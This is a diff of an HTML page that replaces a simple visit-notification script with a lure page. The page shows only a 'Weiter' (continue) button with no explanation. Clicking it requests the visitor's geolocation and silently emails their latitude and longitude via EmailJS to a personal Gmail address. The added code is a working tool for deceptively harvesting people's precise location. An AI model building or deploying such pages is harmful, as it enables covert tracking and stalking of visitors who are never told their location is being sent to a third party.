@@ -1,31 +1,62 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Track Visits</title>
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-    <script>
-        // Initialize EmailJS
-        (function() {
-            emailjs.init('9x-l5mk9badvHiIkw'); 
-        })();
-
-        // Function to send email
-        function sendVisitEmail() {
-            emailjs.send('service_3ubhjey', 'template_pvr5hq8', {
-                message: 'A visitor has landed on your website!',
-            })
-            .then(() => console.log('Email sent successfully!'))
-            .catch((error) => console.error('Failed to send email:', error));
-        }
-
-        // Trigger the email on page load
-        window.onload = sendVisitEmail;
-    </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Weiter</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
 <body>
-    <h1>Welcome to My Website</h1>
-    <p>Thanks for visiting!</p>
+  <button id="getLocationBtn">Weiter</button>
+
+  <script>
+    (function() {
+      emailjs.init('YOUR_USER_ID'); // Replace with your EmailJS user ID
+    })();
+
+    const button = document.getElementById('getLocationBtn');
+
+    button.addEventListener('click', () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const { latitude, longitude } = position.coords;
+
+            // Send email with the coordinates
+            const emailParams = {
+              to_email: 'alex69gggamer@gmail.com', // Replace with your email
+              latitude: latitude,
+              longitude: longitude
+            };
+
+            emailjs.send('service_3ubhjey', 'template_pvr5hq8', emailParams)
+              .then((response) => {
+                console.log('Email sent successfully', response);
+              })
+              .catch((error) => {
+                console.error('Error sending email', error);
+              });
+          },
+          (error) => {
+            console.error(`Error: ${error.message}`);
+          }
+        );
+      } else {
+        console.error("Geolocation is not supported by your browser.");
+      }
+    });
+  </script>
 </body>
 </html>
